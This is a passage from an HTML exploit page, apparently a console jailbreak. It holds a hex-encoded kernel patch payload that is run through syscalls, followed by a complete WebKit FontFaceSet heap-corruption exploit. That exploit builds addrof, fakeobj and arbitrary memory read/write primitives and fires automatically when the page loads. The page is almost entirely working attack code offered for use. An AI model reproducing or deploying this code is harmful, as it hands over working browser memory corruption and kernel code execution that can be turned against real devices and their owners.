0001,0x5D10C483,0x894855C3,0xC0200FE5,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000001C8,0x909007C7,0x47C79090,0x48909004,0x358B48B8,0x000001AC,0x08778948,0x651047C7,0xC73C8B48,0x00251447,0x47C70000,0x89480018,0x1C47C738,0xB8489090,0x7D358B48,0x48000001,0xC7207789,0xC7482847,0x47C70100,0x0000002C,0x778D48E9,0x158B4834,0x00000150,0x89F22948,0x8B483057,0x00016B35,0x568D4800,0xD7294805,0xC148FF89,0x814808E7,0x0000E9CF,0x3E894800,0x00000D48,0x220F0001,0x55C35DC0,0x0FE58948,0x2548C020,0xFFFEFFFF,0x48C0220F,0x013A3D8B,0x07C70000,0x00C3C031,0x353D8B48,0xC7000001,0xC3C03107,0x3D8B4800,0x00000130,0xC03107C7,0x8B4800C3,0x00012B3D,0x3107C700,0x4800C3C0,0x00A63D8B,0x87C70000,0x001F1E01,0x9090F631,0x1E0587C7,0xC931001F,0x87C79090,0x001F1E09,0x9090D231,0x1E3E87C7,0xC931001F,0x0D489090,0x00010000,0xFFC0220F,0x0000EF15,0xC0200F00,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000000DC,0xC03107C7,0x0D4800C3,0x00010000,0x5DC0220F,0x737973C3,0x5F6D6574,0x70737573,0x5F646E65,0x73616870,0x705F3265,0x735F6572,0x00636E79,0x74737973,0x725F6D65,0x6D757365,0x68705F65,0x32657361,0x73797300,0x5F6D6574,0x75736572,0x705F656D,0x65736168,0x90900033,0x00000000,0x00000000,0x000F88F0,0x00000000,0x002EF170,0x00000000,0x00018DF0,0x00000000,0x00018EF0,0x00000000,0x02654110,0x00000000,0x00097230,0x00000000,0x00402E60,0x00000000,0x01520108,0x00000000,0x01520100,0x00000000,0x00462D20,0x00000000,0x00462DFC,0x00000000,0x006259A0,0x00000000,0x006268D0,0x00000000,0x00625DC0,0x00000000,0x00626290,0x00000000,0x00626720,0x00000000];
            for(var i=0; i < PatchPl.length; i++)
            {
              patch_buffer_view[i] = PatchPl[i];
            }
            chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
            chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
            chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
            chain.run();

            showMessage("Loading Payload...<br>Remove the USB Drive.");
            setTimeout(injectPayload, 3000);
        }
        else
        {
            alert("failed to trigger exploit kernel heap might be corrupted, try again or reboot the console");
            p.write8(0, 0);
        }
    });
}
</script>
<script>
var PAGE_SIZE = 16384;
var SIZEOF_CSS_FONT_FACE = 0xb8;
var HASHMAP_BUCKET = 208;
var STRING_OFFSET = 20;
var SPRAY_FONTS = 0x100a;
var GUESS_FONT = 0x200430000;
var NPAGES = 20;
var INVALID_POINTER = 0;
var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time

function poc() {

    var union = new ArrayBuffer(8);
    var union_b = new Uint8Array(union);
    var union_i = new Uint32Array(union);
    var union_f = new Float64Array(union);

    var bad_fonts = [];

    for (var i = 0; i < SPRAY_FONTS; i++)
        bad_fonts.push(new FontFace("font1", "", {}));

    var good_font = new FontFace("font2", "url(data:text/html,)", {});
    bad_fonts.push(good_font);

    var arrays = [];
    for (var i = 0; i < 512; i++)
        arrays.push(new Array(31));

    arrays[256][0] = 1.5;
    arrays[257][0] = {};
    arrays[258][0] = 1.5;

    var jsvalue = {
        a: arrays[256],
        b: new Uint32Array(1),
        c: true
    };

    var string_atomifier = {};
    var string_id = 10000000;

    function ptrToString(p) {
        var s = '';
        for (var i = 0; i < 8; i++) {
            s += String.fromCharCode(p % 256);
            p = (p - p % 256) / 256;
        }
        return s;
    }

    function stringToPtr(p, o) {
        if (o === undefined)
            o = 0;
        var ans = 0;
        for (var i = 7; i >= 0; i--)
            ans = 256 * ans + p.charCodeAt(o + i);
        return ans;
    }

    var strings = [];

    function mkString(l, head) {
        var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
        string_atomifier[s] = 1;
        strings.push(s);
        return s;
    }

    var guf = GUESS_FONT;
    var ite = true;
    var matches = 0;

    var round = 0;

    window.ffses = {};

    do {

        var p_s = ptrToString(NPAGES + 2); // vector.size()
        for (var i = 0; i < NPAGES; i++)
            p_s += ptrToString(guf + i * PAGE_SIZE);
        p_s += ptrToString(INVALID_POINTER);

        for (var i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);

        var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);

        var badstr1 = mkString(HASHMAP_BUCKET, p_s);

        var guessed_font = null;
        var guessed_addr = null;

        for (var i = 0; i < SPRAY_FONTS; i++) {
            bad_fonts[i].family = "search" + round;
            if (badstr1.substr(0, p_s.length) != p_s) {
                guessed_font = i;
                var p_s1 = badstr1.substr(0, p_s.length);
                for (var i = 1; i <= NPAGES; i++) {
                    if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
                        guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
                        break;
                    }
                }
                if (matches++ == 0) {
                    guf = guessed_addr + 2 * PAGE_SIZE;
                    guessed_addr = null;
                }
                break;
            }
        }

        if ((ite = !ite))
            guf += NPAGES * PAGE_SIZE;

    }
    while (guessed_addr === null);

    var p_s = '';
    p_s += ptrToString(26);
    p_s += ptrToString(guessed_addr);
    p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
    for (var i = 0; i < 19; i++)
        p_s += ptrToString(INVALID_POINTER);

    for (var i = 0; i < 256; i++)
        mkString(HASHMAP_BUCKET, p_s);

    var needfix = [];
    for (var i = 0;; i++) {
        ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
        var badstr2 = mkString(HASHMAP_BUCKET, p_s);
        needfix.push(mkString(HASHMAP_BUCKET, p_s));
        bad_fonts[guessed_font].family = "evil2";
        bad_fonts[guessed_font + 1].family = "evil3";
        var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
        if (leak < 0x1000000000000)
            break;
    }

    function makeReader(read_addr, ffs_name) {
        var fake_s = '';
        fake_s += '0000'; //padding for 8-byte alignment
        fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff'; //refcount=255, length=0xffffffff
        fake_s += ptrToString(read_addr); //where to read from
        fake_s += ptrToString(0x80000014); //some fake non-zero hash, atom, 8-bit
        p_s = '';
        p_s += ptrToString(29);
        p_s += ptrToString(guessed_addr);
        p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
        p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
        for (var i = 0; i < 18; i++)
            p_s += ptrToString(INVALID_POINTER);
        for (var i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);
        var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
        mkString(HASHMAP_BUCKET, p_s);
        var relative_read = mkString(HASHMAP_BUCKET, fake_s);
        bad_fonts[guessed_font].family = ffs_name + "_evil1";
        bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
        bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
        needfix.push(relative_read);
        if (relative_read.length < 1000) //failed
            return makeReader(read_addr, ffs_name + '_');
        return relative_read;
    }

    var fastmalloc = makeReader(leak, 'ffs3'); //read from leaked string ptr

    for (var i = 0; i < 100000; i++)
        mkString(128, '');

    var props = [];
    for (var i = 0; i < 0x10000; i++) {
        props.push({
            value: 0x41434442
        });
        props.push({
            value: jsvalue
        });
    }

    var jsvalue_leak = null;

    while (jsvalue_leak === null) {
        Object.defineProperties({}, props);
        for (var i = 0;; i++) {
            if (fastmalloc.charCodeAt(i) == 0x42 &&
                fastmalloc.charCodeAt(i + 1) == 0x44 &&
                fastmalloc.charCodeAt(i + 2) == 0x43 &&
                fastmalloc.charCodeAt(i + 3) == 0x41 &&
                fastmalloc.charCodeAt(i + 4) == 0 &&
                fastmalloc.charCodeAt(i + 5) == 0 &&
                fastmalloc.charCodeAt(i + 6) == 254 &&
                fastmalloc.charCodeAt(i + 7) == 255 &&
                fastmalloc.charCodeAt(i + 24) == 14
            ) {
                jsvalue_leak = stringToPtr(fastmalloc, i + 32);
                break;
            }
        }
    }

    var rd_leak = makeReader(jsvalue_leak, 'ffs4');
    var array256 = stringToPtr(rd_leak, 16); //arrays[256]
    var ui32a = stringToPtr(rd_leak, 24); //Uint32Array

    var rd_arr = makeReader(array256, 'ffs5');
    var butterfly = stringToPtr(rd_arr, 8);

    var rd_ui32 = makeReader(ui32a, 'ffs6');
    for (var i = 0; i < 8; i++)
        union_b[i] = rd_ui32.charCodeAt(i);

    var structureid_low = union_i[0];
    var structureid_high = union_i[1];

    //setup for addrof/fakeobj
    //in array[256] butterfly: 0 = &bad_fonts[guessed_font+12] as double
    //in array[257] butterfly: 0 = {0x10000, 0x10000} as jsvalue
    union_i[0] = 0x10000;
    union_i[1] = 0; //account for nan-boxing
    arrays[257][1] = {}; //force it to still be jsvalue-array not double-array
    arrays[257][0] = union_f[0];
    union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
    union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
    arrays[256][i] = union_f[0];

    //hammer time!

    pp_s = '';
    pp_s += ptrToString(56);
    for (var i = 0; i < 12; i++)
        pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);

    var fake_s = '';
    fake_s += '0000'; //padding for 8-byte alignment
    fake_s += ptrToString(INVALID_POINTER); //never dereferenced
    fake_s += ptrToString(butterfly); //hammer target
    fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000'; //length=34

    var ffs7_args = [];
    for (var i = 0; i < 12; i++)
        ffs7_args.push(bad_fonts[guessed_font + i]);
    ffs7_args.push(good_font);

    var ffs8_args = [bad_fonts[guessed_font + 12]];
    for (var i = 0; i < 5; i++)
        ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));

    for (var i = 0; i < HAMMER_NSTRINGS; i++)
        mkString(HASHMAP_BUCKET, pp_s);

    ffses.ffs7 = new FontFaceSet(ffs7_args);
    mkString(HASHMAP_BUCKET, pp_s);
    ffses.ffs8 = new FontFaceSet(ffs8_args);
    var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
    needfix.push(post_ffs);

    for (var i = 0; i < 13; i++)
        bad_fonts[guessed_font + i].family = "hammer" + i;

    function boot_addrof(obj) {
        arrays[257][32] = obj;
        union_f[0] = arrays[258][0];
        return union_i[1] * 0x100000000 + union_i[0];
    }

    function boot_fakeobj(addr) {
        union_i[0] = addr;
        union_i[1] = (addr - addr % 0x100000000) / 0x100000000;
        arrays[258][0] = union_f[0];
        return arrays[257][32];
    }

    //craft misaligned typedarray

    var arw_master = new Uint32Array(8);
    var arw_slave = new Uint8Array(1);
    var obj_master = new Uint32Array(8);
    var obj_slave = {
        obj: null
    };

    var addrof_slave = boot_addrof(arw_slave);
    var addrof_obj_slave = boot_addrof(obj_slave);
    union_i[0] = structureid_low;
    union_i[1] = structureid_high;
    union_b[6] = 7;
    var obj = {
        jscell: union_f[0],
        butterfly: true,
        buffer: arw_master,
        size: 0x5678
    };

    function i48_put(x, a) {
        a[4] = x | 0;
        a[5] = (x / 4294967296) | 0;
    }

    function i48_get(a) {
        return a[4] + a[5] * 4294967296;
    }

    window.addrof = function (x) {
        obj_slave.obj = x;
        return i48_get(obj_master);
    }

    window.fakeobj = function (x) {
        i48_put(x, obj_master);
        return obj_slave.obj;
    }

    function read_mem_setup(p, sz) {
        i48_put(p, arw_master);
        arw_master[6] = sz;
    }

    window.read_mem = function (p, sz) {
        read_mem_setup(p, sz);
        var arr = [];
        for (var i = 0; i < sz; i++)
            arr.push(arw_slave[i]);
        return arr;
    };

    window.write_mem = function (p, data) {
        read_mem_setup(p, data.length);
        for (var i = 0; i < data.length; i++)
            arw_slave[i] = data[i];
    };

    window.read_ptr_at = function (p) {
        var ans = 0;
        var d = read_mem(p, 8);
        for (var i = 7; i >= 0; i--)
            ans = 256 * ans + d[i];
        return ans;
    };

    window.write_ptr_at = function (p, d) {
        var arr = [];
        for (var i = 0; i < 8; i++) {
            arr.push(d & 0xff);
            d /= 256;
        }
        write_mem(p, arr);
    };

    (function () {
        var magic = boot_fakeobj(boot_addrof(obj) + 16);
        magic[4] = addrof_slave;
        magic[5] = (addrof_slave - addrof_slave % 0x100000000) / 0x100000000;
        obj.buffer = obj_master;
        magic[4] = addrof_obj_slave;
        magic[5] = (addrof_obj_slave - addrof_obj_slave % 0x100000000) / 0x100000000;
        magic = null;
    })();

    //fix fucked objects to stabilize webkit

    (function () {
        //fix fontfaceset (memmoved 96 bytes to low, move back)
        var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
        write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
        //fix strings (restore "valid") header
        for (var i = 0; i < needfix.length; i++) {
            var addr = read_ptr_at(addrof(needfix[i]) + 8);
            write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
            write_ptr_at(addr + 8, addr + 20);
            write_ptr_at(addr + 16, 0x80000014);
        }
        //fix array butterfly
        write_ptr_at(butterfly + 248, 0x1f0000001f);
    })();

    //^ @sleirs' stuff. anything pre arb rw is magic, I'm happy I don't have to deal with that.

    //create compat stuff for kexploit.js
    var expl_master = new Uint32Array(8);
    var expl_slave = new Uint32Array(2);
    var addrof_expl_slave = addrof(expl_slave);
    var m = fakeobj(addrof(obj) + 16);
    obj.buffer = expl_slave;
    m[7] = 1;
    obj.buffer = expl_master;
    m[4] = addrof_expl_slave;
    m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
    m[7] = 1;

    var prim = {
        write8: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            if (value instanceof int64) {
                expl_slave[0] = value.low;
                expl_slave[1] = value.hi;
            } else {
                expl_slave[0] = value;
                expl_slave[1] = 0;
            }
        },
        write4: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            if (value instanceof int64) {
                expl_slave[0] = value.low;
            } else {
                expl_slave[0] = value;
            }
        },
        write2: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            var tmp = expl_slave[0] & 0xFFFF0000;
            if (value instanceof int64) {
                expl_slave[0] = ((value.low & 0xFFFF) | tmp);
            } else {
                expl_slave[0] = ((value & 0xFFFF) | tmp);
            }
        },
        write1: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            var tmp = expl_slave[0] & 0xFFFFFF00;
            if (value instanceof int64) {
                expl_slave[0] = ((value.low & 0xFF) | tmp);
            } else {
                expl_slave[0] = ((value & 0xFF) | tmp);
            }
        },
        read8: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return new int64(expl_slave[0], expl_slave[1]);
        },
        read4: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return expl_slave[0];
        },
        read2: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return expl_slave[0] & 0xFFFF;
        },
        read1: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return expl_slave[0] & 0xFF;
        },
        leakval: function (obj) {
            obj_slave.obj = obj;
            return new int64(obj_master[4], obj_master[5]);
        }
    };
    window.p = prim;
    run_hax();
}
</script>
</head>
<body onload="setTimeout(poc, 1500);">
<div class="info" id="message">Loading Exploit, Please Wait ...</div>
</body>
</html>